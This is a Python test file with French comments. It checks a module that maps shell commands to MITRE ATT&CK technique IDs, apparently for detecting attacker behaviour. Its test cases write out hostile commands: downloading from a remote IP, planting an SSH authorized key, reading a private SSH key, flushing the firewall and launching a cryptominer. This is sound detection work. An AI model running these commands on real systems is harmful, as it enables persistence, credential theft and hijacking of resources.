"""Vérifie la correspondance commande -> technique ATT&CK."""

import collections

import mitre
import pytest


@pytest.mark.parametrize(
    "commande,attendu",
    [
        ("uname -a", "T1082"),
        ("cat /proc/cpuinfo", "T1082"),
        ("free -m", "T1082"),
        ("whoami", "T1033"),
        ("wget http://203.0.113.77/x", "T1105"),
        ("echo cle >> ~/.ssh/authorized_keys", "T1098.004"),
        ("rm -rf /tmp/x", "T1070.004"),
        ("chmod +x robben", "T1222.002"),
        ("crontab -l", "T1053.003"),
        ("iptables -F", "T1562.004"),
        ("./xmrig --donate-level 1", "T1496"),
        ("cat ~/.ssh/id_rsa", "T1552.001"),
    ],
)
def test_technique_reconnue(commande, attendu):
    assert attendu in [tid for tid, _ in mitre.techniques(commande)]


def test_commande_vide():
    assert mitre.techniques("") == []


def test_commande_anodine():
    assert mitre.techniques("echo bonjour") == []


def test_pas_de_technique_en_double():
    """Une technique déclarée deux fois faussait le classement du rapport."""
    identifiants = [(tid, nom) for _, tid, nom in mitre.REGLES]
    doublons = [k for k, v in collections.Counter(identifiants).items() if v > 1]
    assert doublons == []


def test_resultat_sans_repetition():
    """Un one-liner qui déclenche plusieurs fois la même règle ne compte qu'une."""
    commande = "uname -a; uname -s; cat /proc/version; free -m"
    trouvees = mitre.techniques(commande)
    assert len(trouvees) == len(set(trouvees))


def test_toutes_les_regles_compilent():
    assert len(mitre.REGLES_COMPILEES) == len(mitre.REGLES)


def test_id_rsa_ne_declenche_pas_discovery_utilisateur():
    """Le \b doit empêcher 'id' de correspondre dans 'id_rsa'."""
    assert "T1033" not in [tid for tid, _ in mitre.techniques("cat ~/.ssh/id_rsa")]
